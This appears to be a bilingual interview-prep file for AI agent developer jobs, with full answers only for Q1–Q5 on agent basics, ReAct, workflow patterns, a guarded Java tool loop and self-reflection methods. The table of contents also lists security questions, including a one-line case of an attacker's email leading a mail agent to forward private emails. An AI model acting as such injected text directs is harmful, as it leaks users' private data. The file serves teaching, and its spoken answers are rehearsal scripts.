# 06d · AI Agent 开发岗 75 题（按模块，带一手来源）

题目来源：小红书「牛牛蛙」《投Agent开发岗前，先把这75题刷完》（2026-11-03）<https://xhslink.cn/o/1QzRssfrcBL>。原帖只公开了目录（每题后半句被截断）和 Q17 一道样题；本文件的题目后半句按截断前文补全，答案全部按一手资料（官方博客、论文、规范、文档）重写，每题末尾列来源。原帖的数字和一手来源不一致的地方，写在对应题的「坑」里。

难度标注沿用原帖：必考 11 · 核心 26 · 进阶 18 · 实战 13 · 开放 7。已有对应内容的题会链接到 [06 主稿](06-ai-system-design.md)，本文件不重复维护那里的完整论述。

**目录** <a id="toc"></a>

- [模块 A：Agent 基础范式](#ma)
  - [Q1 · 什么是 LLM Agent？它和普通的 LLM 对话、固定 workflow 有什么区别？](#q1)
  - [Q2 · 讲一下 ReAct 的原理，Thought、Action、Observation 各起什么作用？它比纯 CoT 和纯 Act 好在哪？](#q2)
  - [Q3 · Anthropic 总结的 5 种 workflow 模式分别是什么？每种你会在什么场景用？](#q3)
  - [Q4 · 现场手写一个 ReAct 循环，你会在哪些地方加保护？如果模型调用了不存在的工具或参数格式错了怎么办？](#q4)
  - [Q5 · Reflexion、Self-Refine 这类让模型自我反思的方法，什么时候有效，什么时候没用甚至有害？](#q5)
  - [Q6 · ReWOO、LLMCompiler 这类"先规划后执行"的架构相比 ReAct 有什么优缺点？](#q6)
  - [Q7 · 你怎么看"模型越来越强，Agent 框架和 workflow 编排迟早会被淘汰"这个观点？](#q7)
- [模块 B：工具调用与 Function Calling](#mb)
  - [Q8 · Function Calling 的完整流程是怎样的？模型真的"执行"了函数吗？](#q8)
  - [Q9 · 工具描述怎么写才能让模型选对、填对？你有没有量化过工具描述改动的效果？](#q9)
  - [Q10 · 开了 JSON mode 或 Structured Outputs 之后，有人说模型推理变差了，为什么？怎么缓解？](#q10)
  - [Q11 · 你的 Agent 接了 80 个工具，光工具定义就占了 5 万多 token，怎么优化？](#q11)
  - [Q12 · 什么是 Programmatic Tool Calling / Code execution with MCP？它解决了什么问题，代价是什么？](#q12)
  - [Q13 · 线上 Agent 跑到第 30 步开始重复调用同一个工具、参数几乎不变，你怎么排查和修复？](#q13)
- [模块 C：MCP 与 Agent 协议](#mc)
  - [Q14 · MCP 解决了什么问题？Host、Client、Server 分别是什么，各自负责什么？](#q14)
  - [Q15 · MCP 的传输和授权经历了哪些版本变化？为什么要从 HTTP+SSE 换成 Streamable HTTP？](#q15)
  - [Q16 · A2A 和 MCP 是竞争关系吗？A2A 里的 Agent Card 和 Task 分别是什么、怎么用？](#q16)
  - [Q17 · MCP 2026-07-28 版去掉了 initialize 握手和 Mcp-Session-Id，核心协议变成无状态。这解决了什么问题？原来依赖 session 的 Server 怎么迁移？](#q17)
  - [Q18 · 什么是 MCP 的 tool poisoning 和 rug pull？如果让你给 MCP 客户端/网关设计防护，你怎么做？](#q18)
  - [Q19 · MCP 进了 Linux Foundation 的 AAIF 之后，你怎么看它未来的发展？](#q19)
- [模块 D：上下文工程](#md)
  - [Q20 · 上下文工程（context engineering）和提示词工程有什么区别？上下文工程具体要管哪些东西？](#q20)
  - [Q21 · 为什么 Manus 说 KV-cache 命中率是生产 Agent 最重要的指标？怎么设计上下文才能提高命中率？](#q21)
  - [Q22 · 长任务上下文快撑爆了，compaction、context editing、memory tool、子 agent 分别适合什么场景？怎么组合？](#q22)
  - [Q23 · 一个要连续跑好几个小时的 coding agent，你会反复压缩上下文，还是定期重置上下文、靠外部状态接力？为什么？](#q23)
  - [Q24 · 用户反馈 Agent 聊到第 20 轮之后开始忘掉最初的约束、答非所问，你怎么排查和修复？](#q24)
  - [Q25 · 现在主流模型都有百万级上下文了，你怎么看"上下文工程已经不重要了"这种说法？](#q25)
- [模块 E：记忆系统](#me)
  - [Q26 · Agent 的短期记忆和长期记忆分别指什么？CoALA 框架把记忆分成哪几类？](#q26)
  - [Q27 · MemGPT / Letta 的分层记忆是怎么设计的？模型怎么"自己管理"记忆？](#q27)
  - [Q28 · Mem0 的记忆写入流程是什么？它论文里报告的指标，你觉得可信吗？](#q28)
  - [Q29 · 用户说"我搬到上海了"，但记忆里还存着"住在北京"，记忆系统怎么处理这种冲突？](#q29)
  - [Q30 · 2026 年的 LongMemEval-V2 把评测对象从聊天记录换成了 web agent 的任务轨迹，这对记忆系统设计意味着什么？](#q30)
  - [Q31 · 线上出现"记忆污染"：用户一句玩笑话被当成事实存进长期记忆，之后每次回答都被带偏，怎么处理和预防？](#q31)
- [模块 F：RAG 与检索](#mf)
  - [Q32 · RAG 的基本流程是什么？Agent 为什么需要 RAG，而不是把知识微调进模型或全塞进上下文？](#q32)
  - [Q33 · 为什么要做混合检索？BM25 和向量检索的结果怎么融合？RRF 的原理和参数怎么定？](#q33)
  - [Q34 · Agentic RAG 和传统 RAG 有什么区别？Self-RAG、CRAG 分别做了什么？](#q34)
  - [Q35 · GraphRAG 和普通向量 RAG 各适合什么问题？GraphRAG 的成本问题怎么解决？](#q35)
  - [Q36 · 你的知识库问答 Agent 线上召回看着还行，但答案经常引用错误或过期的段落、引用和结论对不上，怎么排查和修复？](#q36)
  - [Q37 · 设计一个面向企业内部 10 万份文档、每天都有更新的深度研究（deep research）问答 Agent](#q37)
- [模块 G：规划与推理](#mg)
  - [Q38 · CoT、ToT、Plan-and-Execute 分别是什么？Agent 里说的"规划"具体指什么？](#q38)
  - [Q39 · 把推理模型（o 系列、DeepSeek-R1、Claude extended thinking）用在 Agent 里，有什么好处和坑？要注意什么？](#q39)
  - [Q40 · Anthropic 的 think tool 是什么？它和 extended thinking 有什么区别？什么时候用哪个？](#q40)
  - [Q41 · LATS 这类在 Agent 上做树搜索的方法为什么在生产里用得少？什么场景值得用？](#q41)
  - [Q42 · 现在模型厂商怎么用 Agentic RL 训练工具使用能力？这对 Agent 开发者意味着什么？](#q42)
- [模块 H：多智能体编排](#mh)
  - [Q43 · 多智能体系统有哪些常见架构？handoff 和 agents-as-tools 有什么区别，各适合什么场景？](#q43)
  - [Q44 · Anthropic 的多智能体研究系统比单 agent 强 90.2%，这个提升从哪里来？代价是什么？](#q44)
  - [Q45 · Cognition 写了《Don't Build Multi-Agents》，和 Anthropic 的多智能体研究系统观点相反，你怎么看？](#q45)
  - [Q46 · 多智能体系统失败的常见原因有哪些？MAST 是怎么分类的？](#q46)
  - [Q47 · 你的多智能体研究系统线上偶发：三个子 agent 查了几乎一样的内容，最终报告重复，关键方面反而漏掉，token 成本翻倍。你怎么排查和修复？](#q47)
  - [Q48 · Claude Code 推出了 agent teams，让多个 Claude 实例分工协作、互相发消息。你怎么看这种做法？](#q48)
- [模块 I：框架与工程化](#mi)
  - [Q49 · LangGraph 的核心概念有哪些？Agent 为什么需要 checkpoint？](#q49)
  - [Q50 · LangChain 1.0 的 create_agent 和 middleware 机制解决了什么问题？](#q50)
  - [Q51 · 一个要跑 2 小时、调用上百次工具的 Agent 任务，进程中途挂了，怎么保证能恢复、不重复执行副作用？](#q51)
  - [Q52 · Claude Managed Agents、OpenAI Agents SDK 的 sandbox 这类托管 agent 基础设施解决了什么问题？你会怎么选？](#q52)
  - [Q53 · Agent 服务上线后 p95 延迟 40 秒，用户大量流失，你怎么排查和优化？](#q53)
- [模块 J：Coding 与 Computer Use Agent](#mj)
  - [Q54 · SWE-agent 提出的 ACI（Agent-Computer Interface）是什么？为什么比直接给模型一个 shell 效果好？](#q54)
  - [Q55 · Agent Skills 是什么？渐进式披露是怎么做的？它和 MCP 是什么关系？](#q55)
  - [Q56 · Claude Code 的权限和沙箱是怎么设计的？hooks 能拿来做什么？](#q56)
  - [Q57 · OpenAI 说内部一个小团队用 Codex 写了约 100 万行代码、零行手写。他们提出的 harness engineering 是什么？你怎么看？](#q57)
  - [Q58 · 设计一个自动修复 GitHub issue 并提 PR 的 coding agent 系统](#q58)
  - [Q59 · 你怎么看"OSWorld 上 Agent 已经追上人类基线"这件事？](#q59)
- [模块 K：评测与可观测性](#mk)
  - [Q60 · 为什么 Agent 评测要看 pass^k 而不只是 pass@k？τ-bench 是怎么定义和测出来的？](#q60)
  - [Q61 · LLM-as-judge 怎么用才靠谱？它有哪些已知偏差？](#q61)
  - [Q62 · OpenAI 为什么在 2026 年不再报告 SWE-bench Verified？换成了什么，对我们自己做评测有什么启示？](#q62)
  - [Q63 · 用 OpenTelemetry 给 Agent 做可观测性，span 怎么建模？要记哪些属性？](#q63)
  - [Q64 · GAIA、BrowseComp、Gaia2、OSWorld 2.0 这些 benchmark 分别测什么？各自的局限是什么？](#q64)
  - [Q65 · 你改了 system prompt，离线评测涨了 3 个点，上线后用户投诉反而变多了，怎么排查？](#q65)
- [模块 L：安全、成本与上线](#ml)
  - [Q66 · 什么是间接 prompt 注入？为什么它在 Agent 里比在聊天机器人里危险得多？](#q66)
  - [Q67 · OWASP Agentic Top 10（2026）列了哪些风险？结合你的项目说说你防了哪几条。](#q67)
  - [Q68 · Agent 的成本怎么优化？你能说出至少 4 种手段并估算各自的收益吗？](#q68)
  - [Q69 · 学术界提了很多 prompt 注入防御，为什么《The Attacker Moves Second》说它们大多不管用？工程上该怎么办？](#q69)
  - [Q70 · 你的邮件助手 Agent 被曝出问题：攻击者发来一封邮件，Agent 读完后把用户的私密邮件转发了出去。你怎么处理？](#q70)
- [模块 M：项目深挖、系统设计与行为面](#mm)
  - [Q71 · 设计一个日均 100 万次咨询的电商客服 Agent，要能查订单、改地址、退款，还要能转人工。](#q71)
  - [Q72 · 设计一个深度研究（Deep Research）Agent：用户给一个问题，Agent 自己检索几十上百个来源，输出带引用的长报告。](#q72)
  - [Q73 · 线上 Agent 换了新版本模型后，任务成功率掉了 10 个点，你怎么排查和处理？](#q73)
  - [Q74 · 你怎么看"Agent 开发工程师"这个岗位在模型能力持续提升之后的前景？会不会被模型本身取代？](#q74)
  - [Q75 · 你怎么看 MCP、A2A、Agent Skills、AGENTS.md 这一批 Agent 标准？它们会怎么演进？](#q75)

## 模块 A：Agent 基础范式 <a id="ma"></a> [↑ 目录](#toc)

![带保护的 ReAct 循环：循环级、调用级、执行级三层保护，加每步留痕](notes/images/06d-react-guards.svg)

### Q1 · 什么是 LLM Agent？它和普通的 LLM 对话、固定 workflow 有什么区别？ <a id="q1"></a> [↑ 目录](#toc)

**English question:** What is an LLM agent, and how is it different from a plain LLM chat and from a fixed workflow?
（难度：必考 · 题目后半句按截断前文补全）

**现有笔记：** [04 Agent 入门](notes/04-agent-basics.md) 讲了"Agent = LLM + 工具 + 记忆（memory） + 循环（loop）"和模型/agent 对比表；[06 §2.3](06-ai-system-design.md#s2-3) 讲了 Anthropic 的 workflow vs agent 区分和"默认从 workflow 起步"。本题把三者放在一条"谁决定下一步"的轴上。

**答案要点**
1. **增强型大模型（augmented LLM）**：模型加上检索（retrieval）、工具、记忆三样能力，能自己生成搜索词、挑工具、决定记什么。Anthropic 把它当成所有 agent 系统的基本积木。
2. **三者的区别只看一件事：下一步由谁决定。**
   - 普通对话（plain chat）：一问一答。模型不调用外部系统，也不会自己发起下一步。
   - 工作流（workflow）：Anthropic 原文定义为"LLM 和工具通过预先写好的代码路径来编排（orchestration）"。路径是代码写死的，模型只在节点里做判断。
   - 智能体（agent）：模型"动态地指挥自己的流程和工具使用"。调什么工具、调几次、什么时候停，由模型在循环里决定。
3. **Agent 的最小结构**：一个循环（loop）。模型输出工具调用（tool call） → 代码执行 → 结果回填上下文（context） → 模型再决定。停止条件（stop condition）写在代码里：任务完成、步数或预算（budget）用完、超时（timeout）、需要人工确认（human confirmation）。
4. **什么时候用 agent**：步数无法预估、路径没法写死的开放问题，比如修 bug、开放式排查。代价是成本更高、延迟（latency）更长，还有错误累积（compounding errors）：前面一步错了，后面每一步都建立在错误上。Anthropic 建议先找最简单的方案，只在确实需要时才加复杂度。
5. **工程上是一个光谱，不是二选一**：可以整体用 workflow，只在某个节点里放一个有步数上限的小 agent 循环。

**English answer (speakable, ~45–75 s):**
> The way I separate the three is by asking who decides the next step. In a plain chat, nobody does — it's one request, one response, and the model doesn't touch any external system. In a workflow, my code decides: the path is predefined, and the model only makes judgments inside each node, like classifying a ticket or drafting a summary. In an agent, the model decides: it runs in a loop, picks a tool, my code executes it, the result goes back into context, and the model chooses what to do next until a stop condition fires. Agents are the right tool when the number of steps genuinely can't be predicted — debugging, open-ended investigation. But they cost more, they're slower, and errors compound across steps, so my default is a workflow. In my project, the investigation protocol is a fixed workflow, and the model only does semantic classification and evidence comparison inside it. I add autonomy only where the path really depends on the input.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 一个带 RAG 的聊天机器人算 agent 吗？ | 看检索是谁触发的。代码每次都先检索再生成，就是固定的两步 workflow。模型自己决定要不要检索、检索几次，才算 agent，也就是 agentic RAG。 | "Depends on who triggers retrieval. If my code always retrieves then generates, it's a two-step workflow. If the model decides whether and how many times to search, that's agentic." |
| 停止条件为什么不能交给模型？ | 模型可能过早宣布完成，也可能一直不停。步数上限、token 预算、墙钟超时必须由代码强制执行，模型说的"完成"只算一种信号。 | "The model can stop too early or never stop. Step caps, token budgets and wall-clock timeouts are enforced in code; the model's 'done' is just one signal." |

**坑**
- 把"用了 LLM"就叫 agent。判断标准是控制流（control flow）由谁决定，不是有没有调模型。
- 把 Anthropic 的 5 种模式都叫 agent。原文里那 5 种都是 workflow，agent 是单独的一类（见 Q3）。
- 只讲优点。面试官要听到成本、延迟、错误累积和可评估性（evaluability）这几项代价。

**来源：** [Anthropic — Building effective agents (2024-12-19)](https://www.anthropic.com/engineering/building-effective-agents)

---

### Q2 · 讲一下 ReAct 的原理，Thought、Action、Observation 各起什么作用？它比纯 CoT 和纯 Act 好在哪？ <a id="q2"></a> [↑ 目录](#toc)

**English question:** Explain how ReAct works. What role do Thought, Action and Observation each play, and why does it beat pure chain-of-thought or pure acting?
（难度：必考 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3](06-ai-system-design.md#s2-3) 把"工具循环（ReAct tool loop）"列为唯一真正的 agent 模式；[06 §2.3 工具调用三种形态](06-ai-system-design.md#h18) 讲了多轮（multi-turn）顺序调用的 token 随步数平方增长。本题补论文机制和实验结论。

**答案要点**
1. **ReAct = Reason + Act**（Yao 等，ICLR 2023）。让模型交替输出推理（reasoning）和动作，形成 Thought → Action → Observation 的循环。
2. **三个部分各管一件事**
   - Thought（思考）：用自然语言分析现状、拆解目标、决定下一步做什么。它不改变外部世界，只更新模型自己的"工作记忆（working memory）"。
   - Action（行动）：一次结构化的工具调用，比如 `search[...]`、`lookup[...]`、`finish[answer]`。
   - Observation（观察）：环境返回的结果，由代码追加进上下文，不是模型写的。
3. **比纯思维链（chain-of-thought, CoT）好在哪**：CoT 只靠模型自身知识推理，事实错了会一路错下去，也就是幻觉（hallucination）。ReAct 每一步都能查外部信息，推理有事实依据，而且轨迹（trajectory）可读、可调试。
4. **比纯行动（Act-only）好在哪**：没有 Thought 时，模型不会拆目标、不记进度，也不会在结果异常时调整计划。Thought 让它能跟踪"做到哪了"，并处理意外。
5. **论文数字**：在 ALFWorld（文本家务模拟）和 WebShop（模拟购物网站）上，ReAct 只用 1–2 个示例，绝对成功率（success rate）分别比模仿学习（imitation learning）和强化学习（reinforcement learning, RL）基线（baseline）高 34 和 10 个百分点。知识类任务用的是 HotpotQA（多跳问答）和 FEVER（事实核查）。
6. **今天的落地形式**：生产里很少再让模型输出 `Thought:` 文本再用正则解析。通常用原生工具调用（native tool calling）表示 Action，推理放在模型的思考块或普通文本里。循环结构没变。

**English answer (speakable, ~45–75 s):**
> ReAct interleaves reasoning and acting in one loop. The Thought is free-text reasoning: what do I know, what's missing, what should I do next. It doesn't change the world, it just updates the model's working plan. The Action is a structured tool call, like a search or a lookup. The Observation is what the environment returns, and my code appends it to the context, never the model. Compared with pure chain-of-thought, the model can ground each step in real data instead of hallucinating facts and building on them. Compared with acting without thoughts, the model can decompose the goal, track progress, and recover when an observation is surprising. In the paper, with only one or two examples, it beat imitation and RL baselines by 34 points on ALFWorld and 10 points on WebShop. In production today, I don't parse "Thought:" strings — I use native tool calling for the action and let the model reason in its own thinking or text, but the loop is the same.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| ReAct 的主要缺点？ | 一是串行：每一步都要等一次模型调用。二是上下文越滚越大：每一轮都要把全部历史重发一遍，累计 token 大致和步数平方成正比。三是容易绕圈。Q6 的先规划后执行就是针对前两点。 | "It's serial, one model call per step, and the whole history is resent every turn, so cumulative tokens grow roughly quadratically. It can also loop. Plan-then-execute targets the first two." |
| Observation 太长怎么办？ | 在工具层做预算：限条数、限字节、分页、明确标出截断。上下文里旧的工具结果可以清掉，只留最近几条（见 Q13）。 | "Budget it at the tool layer — rows, bytes, pagination, explicit truncation — and clear old tool results from context, keeping only the latest few." |

**坑**
- 说 Observation 是模型"想象"的结果。Observation 一定来自真实执行，模型自己编的观察正是要防的情况。
- 把 ReAct 说成一种训练（training）方法。它是提示/推理范式（prompting paradigm），不改模型权重。
- 背了 34%/10% 却不知道基线是什么：比的是模仿学习和强化学习方法，用的是绝对成功率。

**来源：** [ReAct: Synergizing Reasoning and Acting in Language Models (arXiv 2210.03629, ICLR 2023)](https://arxiv.org/abs/2210.03629)

---

### Q3 · Anthropic 总结的 5 种 workflow 模式分别是什么？每种你会在什么场景用？ <a id="q3"></a> [↑ 目录](#toc)

**English question:** What are the five workflow patterns from Anthropic's "Building effective agents", and when would you use each one?
（难度：必考 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3](06-ai-system-design.md#s2-3) 有完整的六行表（5 种 workflow + 工具循环），带大白话和例子；[06 §2.12](06-ai-system-design.md#s2-12) 讲怎么用 LangGraph 实现这些模式。本题补原文的"何时用"判据和每种模式最常见的误用。

**答案要点**
1. **基础积木是增强型大模型（augmented LLM）**，也就是带检索、工具、记忆的模型。下面 5 种都是把它按固定方式组合起来。
2. **提示链（prompt chaining）**：拆成固定顺序的几次调用，中间可以插代码检查（gate）。原文判据："任务能干净地拆成固定子任务（subtask）"。例子：先写营销文案再翻译；先写大纲、检查合格后再写全文。
3. **路由（routing）**：先分类，再分给专门的后续流程。判据：输入有"明显不同、分开处理更好的类别"。例子：客服的一般问题、退款（refund）、技术问题分流；简单问题给小模型（small model），难题给大模型。
4. **并行（parallelization）**：同时跑多个调用再汇总。分两种：分段（sectioning）是各做独立的一部分，投票（voting）是同一件事做几次。例子：一个模型答题，另一个同时做安全过滤；几个提示分别审查代码漏洞。
5. **主管-工人（orchestrator-workers）**：中心模型动态拆任务、派给工人、汇总结果。判据："无法预知需要哪些子任务"。和并行的区别是子任务不是事先写好的。例子：要改多个文件的编码任务、多来源搜索分析。
6. **生成-评审（evaluator-optimizer）**：一个模型生成，另一个按标准给反馈，循环改进。判据：有清晰的评价标准，而且迭代改进"能带来可衡量的价值"。例子：文学翻译、多轮搜索（由评审决定还要不要继续搜）。
7. **这 5 种之外才是 agent**：模型在循环里自己决定步骤，适合开放问题。原文要求先在沙箱（sandbox）里充分测试并加护栏（guardrails）。

**English answer (speakable, ~45–75 s):**
> All five are built from one block: an LLM augmented with retrieval, tools and memory. Prompt chaining is a fixed sequence of calls with code checks in between — I use it when the task cleanly splits into fixed steps, like extract, validate, then summarize. Routing classifies the input first and sends it down a specialized path — support tickets split into billing, refunds and technical, or easy questions to a cheaper model. Parallelization runs calls at the same time, either sectioning independent subtasks or voting on the same task for confidence — like a guardrail check running alongside the main answer. Orchestrator-workers is when a central model decides the subtasks at runtime because I can't predict them, like a code change that touches an unknown number of files. Evaluator-optimizer is a generate-critique loop, worth it only when I have clear criteria, like code plus tests. All five are workflows, since my code owns the control flow. A true agent is the sixth thing: the model owns the loop.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 并行和主管-工人有什么区别？ | 并行的子任务是代码事先写好的，主管-工人的子任务是模型运行时决定的。能事先列出子任务就用并行，更便宜，也更容易评估。 | "In parallelization my code defines the subtasks up front; in orchestrator-workers the model decides them at runtime. If I can enumerate them, I use parallelization — cheaper and easier to evaluate." |
| 你的项目用了哪几种？ | 路由（按问题类型选调查协议）+ 并行分段（并发拉取多个信号）+ 提示链（抽取 → 代码校验 → 结论）。没有用自由的 agent 循环。 | "Routing to pick the investigation protocol, sectioned parallel calls to fetch signals concurrently, and a chain of extract, code validation, then conclusion. No free-form agent loop." |

**坑**
- 说成"5 种 agent 模式"。原文的分法是 5 种 workflow，agent 单独一类。
- 把生成-评审用在没有客观标准的任务上。没有可靠的评审信号，循环只会烧 token，甚至越改越差（见 Q5）。
- 不知道这篇文章的日期是 2024-12，页面上已注明部分工具已过时。原则仍然有效，具体框架名要以最新文档为准。

**来源：** [Anthropic — Building effective agents (2024-12-19)](https://www.anthropic.com/engineering/building-effective-agents)

---

### Q4 · 现场手写一个 ReAct 循环，你会在哪些地方加保护？如果模型调用了不存在的工具或参数格式错了怎么办？ <a id="q4"></a> [↑ 目录](#toc)

**English question:** Write a ReAct loop on the whiteboard. Where do you add safeguards, and what do you do when the model calls a tool that doesn't exist or sends malformed arguments?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.7 ⑤ 失控循环](06-ai-system-design.md#h36) 列了步数上限、token 预算、墙钟超时、重复调用去重（deduplication）、按租户（tenant）的花费熔断（circuit breaker）；[06 §2.3 工具调用三种形态](06-ai-system-design.md#h18) 讲了按错误类型选择恢复策略。本题把这些落到代码里。

**答案要点**
1. **循环骨架**：调模型 → 看停止原因（stop reason）→ 没有工具调用就结束 → 有就逐个执行 → 把每个结果按 id 配对回填 → 下一轮。Anthropic API 里，`stop_reason: "tool_use"` 表示模型要调工具，结果用 `tool_result` 回传，并带上对应的 `tool_use_id`。
2. **循环级保护**：步数上限、token 预算、墙钟预算（wall-clock budget）三者都由代码强制执行。超限时返回已有的部分结果和明确状态，不能静默截断（truncation）。
3. **调用级保护**
   - 工具不存在：不抛异常中断循环，回一个 `is_error: true` 的结果，列出可用工具名，让模型改正。
   - 参数不合法：先做 schema 校验（validation），再做业务校验。把具体错误（哪个字段、为什么错）回给模型，同一类错误限制重试（retry）次数。
   - 也可以开严格工具调用（strict tool use，`strict: true`）：用受约束解码（constrained decoding）保证参数符合 schema，从源头去掉格式错误。业务语义错误仍然要自己校验。
4. **执行级保护**：每个工具都有超时；工具结果（tool result）有字节预算并明确标出截断；"工具名 + 规范化（normalization）参数"的哈希（hash）重复出现就判定为循环；写操作（write operation）要做权限（permission）校验、带幂等键（idempotency key），必要时人工审批（human approval）。
5. **可观测性（observability）**：每一步记一个 span，包含输入、工具、参数、耗时、token 和错误类型，事后能完整回放（replay）。

```java
AgentResult runLoop(Task task) {
    List<Message> messages = new ArrayList<>(task.initialMessages());
    Set<String> seenCallKeys = new HashSet<>();
    long deadline = clock.millis() + WALL_CLOCK_BUDGET_MS;
    int tokensUsed = 0;

    for (int step = 0; step < MAX_STEPS; step++)
    {
        if (clock.millis() > deadline || tokensUsed > TOKEN_BUDGET)
        {
            return AgentResult.partial(messages, "BUDGET_EXHAUSTED");
        }
        ModelResponse response = model.call(messages, toolRegistry.definitions());
        tokensUsed += response.usage().totalTokens();
        messages.add(response.asAssistantMessage());

        if (!response.stopReason().equals("tool_use"))
        {
            return AgentResult.done(response.text());
        }
        List<ToolResult> toolResults = new ArrayList<>();
        for (ToolCall toolCall : response.toolCalls())
        {
            toolResults.add(executeGuarded(toolCall, seenCallKeys));
        }
        messages.add(Message.userToolResults(toolResults));
    }
    return AgentResult.partial(messages, "MAX_STEPS_REACHED");
}

ToolResult executeGuarded(ToolCall toolCall, Set<String> seenCallKeys) {
    Tool tool = toolRegistry.find(toolCall.name());
    if (tool == null)
    {
        return ToolResult.error(toolCall.id(), "UNKNOWN_TOOL: available tools are " + toolRegistry.names());
    }
    List<String> violations = tool.validate(toolCall.arguments());
    if (!violations.isEmpty())
    {
        return ToolResult.error(toolCall.id(), "INVALID_ARGUMENT: " + String.join("; ", violations));
    }
    String callKey = toolCall.name() + ":" + canonicalJson(toolCall.arguments());
    if (!seenCallKeys.add(callKey))
    {
        return ToolResult.error(toolCall.id(), "DUPLICATE_CALL: same call already made; use the earlier result or change approach");
    }
    if (tool.isWrite() && !policy.allows(toolCall))
    {
        return ToolResult.error(toolCall.id(), "FORBIDDEN: requires human approval");
    }
    try
    {
        return tool.execute(toolCall, TOOL_TIMEOUT_MS).truncateTo(MAX_RESULT_BYTES);
    }
    catch (TimeoutException timeoutException)
    {
        return ToolResult.error(toolCall.id(), "UPSTREAM_TIMEOUT: retryable=" + tool.isIdempotent());
    }
}
```

**English answer (speakable, ~45–75 s):**
> The loop itself is short: call the model, and if it stopped for tool use, execute each call, pair every result with its call id, append, and go again. The safeguards are where the real work is. At the loop level, code enforces a step cap, a token budget and a wall-clock budget, and when any of them trips, I return a partial result with an explicit status instead of silently cutting off. At the call level, an unknown tool or bad arguments never crash the loop — I return a typed error result that says exactly what's wrong and lists the valid tools, so the model can self-correct, with a cap on retries. If the provider supports strict tool use, I turn it on so arguments always match the schema, but I still run business validation. At execution level, every tool has a timeout and a byte budget with explicit truncation, a hash of tool name plus normalized arguments catches loops, and writes need authorization and an idempotency key. Every step emits a trace span so I can replay it.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 模型并行发了 3 个工具调用，其中 1 个失败怎么办？ | 3 个结果都要回传，并按 id 配对：成功的照常返回，失败的标错误类型。不能把失败吞掉，也不能变成空结果。只读调用可以并发执行，写调用串行。 | "Return all three results paired by id — successes as normal, the failure as a typed error, never dropped or turned into empty. Read calls run concurrently; writes go serially." |
| 达到步数上限时给用户什么？ | 返回结构化的部分结果：已经确认了什么、还缺什么、为什么停下。然后转人工或建议用户缩小范围。不要硬让模型编一个最终答案。 | "A structured partial result: what's confirmed, what's missing, and why it stopped — then hand off to a human. I don't force the model to invent a final answer." |

**坑**
- 遇到未知工具或非法参数时直接抛异常。循环中断后，模型失去了自我纠正（self-correction）的机会。
- 回传结果时漏了某个 `tool_use_id`，或者顺序配错。很多 API 会直接报错，或者让模型误读结果。
- 以为开了 strict 模式就不用校验了。它只保证格式，不保证 ID 存在、权限够、数值在业务范围内。

**来源：** [Claude docs — Tool use overview](https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview)、[Claude docs — Structured outputs (strict tool use)](https://platform.claude.com/docs/en/build-with-claude/structured-outputs)、[Anthropic — Writing effective tools for agents (2025-09-11)](https://www.anthropic.com/engineering/writing-tools-for-agents)

---

### Q5 · Reflexion、Self-Refine 这类让模型自我反思的方法，什么时候有效，什么时候没用甚至有害？ <a id="q5"></a> [↑ 目录](#toc)

**English question:** When do self-reflection methods like Reflexion and Self-Refine actually help, and when are they useless or even harmful?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3 研究案例的共同骨架](06-ai-system-design.md#h20) 讲了"生成 → 验证 → 反思 → 选择"骨架，以及"验证器（verifier）越可靠，越敢放开自主度"；[06 §2.3 控制面](06-ai-system-design.md#h19) 讲了 reflection 用规则或 LLM 评委（judge）判断"是否偏离"。本题补两篇论文的机制，以及反例论文。

**答案要点**
1. **Self-Refine**（Madaan 等，2023）：同一个模型轮流扮演生成者、反馈者、修改者，循环改进，不需要训练。在 7 个任务上平均绝对提升约 20%。
2. **Reflexion**（Shinn 等，2023）：用语言形式的反馈代替改权重，叫言语强化（verbal reinforcement）。任务失败后，模型写一段反思存进情景记忆（episodic memory），下一次尝试时带上。反馈信号可以来自外部（测试结果）或模型自己。HumanEval pass@1 达到 91%，对比 GPT-4 的 80%。
3. **什么时候有效**：有外部、可信的反馈信号。比如编码有单元测试（unit test），网页任务能看到环境状态，或者有明确的评分标准（rubric）。Reflexion 在编码上效果好，正是因为测试结果是客观信号。
4. **什么时候没用甚至有害**：没有外部反馈的纯推理题。Huang 等（ICLR 2024）发现，模型在没有外部反馈时很难纠正自己的推理，自我纠正后表现有时反而下降：把对的改成错的，因为它判断不了自己哪里错了。
5. **工程结论**：反思环节要接一个验证器（verifier），也就是测试、规则、检索到的证据，或者一个独立的、经过校准（calibration）的评审模型；要限制轮数；改之前和改之后都要评分，只有变好才采纳。延迟和 token 会增加好几倍，要在评测集（eval set）上证明值得。

**English answer (speakable, ~45–75 s):**
> Self-Refine has the same model generate, critique and revise in a loop with no training — about 20 points absolute average gain across seven tasks. Reflexion keeps the weights frozen but writes a verbal reflection after a failed attempt into an episodic memory, and the next attempt reads it; it hit 91% pass@1 on HumanEval versus 80% for GPT-4. The common thread is that they work when there's a real feedback signal — unit tests, environment state, a clear rubric. Without one, it's risky: a 2024 paper showed models often can't fix their own reasoning without external feedback, and sometimes change a right answer to a wrong one. So in production I never let the model just "think again." I wire reflection to a verifier — tests, rules, retrieved evidence, or an independent calibrated judge — cap the rounds, score before and after, and keep the revision only if it actually scores better. And I prove on the eval set that the extra latency is worth it.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 用同一个模型当评审可以吗？ | 可以，但它和生成者有相同的盲点。更好的做法：换一个模型，或者给评审看生成者看不到的证据，或者先用规则把能检查的都检查掉。评审的准确率本身也要在人工标注集上测。 | "It can work, but it shares the generator's blind spots. Better: a different model, give the judge evidence the generator didn't have, or check what rules can check first — and measure the judge against human labels." |
| Reflexion 的记忆会不会越积越乱？ | 会。反思要有长度上限，只保留最近几条（论文里就是滑动窗口）。按任务隔离，不要把一个任务的教训泛化到无关任务。 | "Yes — cap reflection length, keep only the last few, as the paper does with a sliding window, and scope them per task so a lesson doesn't leak into unrelated tasks." |

**坑**
- 说"让模型自我反思就能减少幻觉"。没有外部信号时，可能更糟。
- 只报准确率不报成本。每加一轮反思就多一次或几次调用，延迟成倍增加。
- 把 Reflexion 说成强化学习训练。它不更新权重，"强化"指的是用语言反馈引导下一次尝试。

